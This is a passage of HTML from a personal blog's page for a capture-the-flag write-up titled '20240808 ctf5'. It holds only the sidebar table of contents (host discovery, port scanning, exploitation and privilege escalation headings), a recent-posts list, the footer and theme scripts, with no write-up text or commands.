class="length-num">17</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">16</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#20240808-ctf5"><span class="toc-number">1.</span> <span class="toc-text">20240808 ctf5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Host-Discovery"><span class="toc-number">1.1.</span> <span class="toc-text">Host Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-Scanning"><span class="toc-number">1.2.</span> <span class="toc-text">Port Scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Exploitation"><span class="toc-number">1.3.</span> <span class="toc-text">Vulnerability Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.4.</span> <span class="toc-text">Privilege Escalation</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/08/09/20240808-ctf7/" title="20240808 ctf7"><img src="/img/12.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="20240808 ctf7"/></a><div class="content"><a class="title" href="/2024/08/09/20240808-ctf7/" title="20240808 ctf7">20240808 ctf7</a><time datetime="2024-08-09T03:28:53.000Z" title="Created 2024-08-09 11:28:53">2024-08-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/09/20240808-ctf5/" title="20240808 ctf5"><img src="/img/11.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="20240808 ctf5"/></a><div class="content"><a class="title" href="/2024/08/09/20240808-ctf5/" title="20240808 ctf5">20240808 ctf5</a><time datetime="2024-08-09T03:28:48.000Z" title="Created 2024-08-09 11:28:48">2024-08-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/31/20240719-AdmX-new/" title="20240719 AdmX_new"><img src="/img/10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="20240719 AdmX_new"/></a><div class="content"><a class="title" href="/2024/07/31/20240719-AdmX-new/" title="20240719 AdmX_new">20240719 AdmX_new</a><time datetime="2024-07-31T15:59:59.000Z" title="Created 2024-07-31 23:59:59">2024-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/31/20240719-Prime-Series-Level-1/" title="20240719  Prime_Series_Level-1"><img src="/img/9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="20240719  Prime_Series_Level-1"/></a><div class="content"><a class="title" href="/2024/07/31/20240719-Prime-Series-Level-1/" title="20240719  Prime_Series_Level-1">20240719  Prime_Series_Level-1</a><time datetime="2024-07-31T15:59:58.000Z" title="Created 2024-07-31 23:59:58">2024-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/14/20240714-SickOs1-1/" title="20240714 SickOs1.1"><img src="/img/8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="20240714 SickOs1.1"/></a><div class="content"><a class="title" href="/2024/07/14/20240714-SickOs1-1/" title="20240714 SickOs1.1">20240714 SickOs1.1</a><time datetime="2024-07-14T14:06:38.000Z" title="Created 2024-07-14 22:06:38">2024-07-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/11.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Ethan</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://butterfly.js.org/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>